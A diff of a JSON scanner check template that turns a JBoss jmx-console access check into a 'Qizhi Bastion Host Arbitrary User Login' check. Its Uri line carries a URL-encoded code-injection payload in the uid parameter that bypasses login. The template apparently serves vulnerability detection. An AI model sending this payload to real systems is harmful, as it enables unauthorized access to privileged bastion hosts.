@@ -1,13 +1,13 @@
 {
-    "Name": "jboss-unauth",
-    "Description": "jboss-unauth, unauthorized access vulnerability",
-    "Product": "jboss",
+    "Name": "Qizhi Bastion Host Arbitrary User Login",
+    "Description": "Qizhi Bastion Host Arbitrary User Login",
+    "Product": "Qizhi",
     "author": "chumeng",
     "Request":[
-        {
+                {
         "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/jmx-console/",
+        "Uri":"/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -18,12 +18,8 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "jboss.management.local"
-                }, {
-                    "Operation": "contains", 
-                    "Key":"",
-                    "Value": "jboss.web"
-                    },
+                "Value": "错误的id"
+                },
                  {
                 "Operation": "code", 
                 "Key":"",
